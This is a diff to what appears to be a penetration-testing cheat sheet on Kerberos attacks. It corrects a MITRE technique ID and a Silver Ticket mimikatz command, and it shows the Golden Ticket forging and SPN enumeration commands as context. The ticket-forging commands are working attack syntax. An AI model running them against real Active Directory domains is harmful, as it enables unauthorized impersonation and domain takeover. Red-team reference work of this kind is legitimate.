@@ -1,6 +1,6 @@
 # Kerberos Attacks
 
-## Kerberoasting (T1208)
+## Kerberoasting (T1558.003)
 ```powershell
 # Find accounts with SPN set
 Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
@@ -35,7 +35,7 @@ kerberos::golden /domain:DOMAIN /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:fakeAdm
 
 ## Silver Ticket (requires service account hash)
 ```
-kerberos::golden /sid:USER_SID /domain:DOMAIN /ptt /target:SERVER /service:http /rc4:SVC_HASH /user:fakeUser
+kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /ptt /target:SERVER /service:http /rc4:SVC_HASH /user:fakeUser
 ```
 - Forged TGS for specific service; no DC validation needed
 
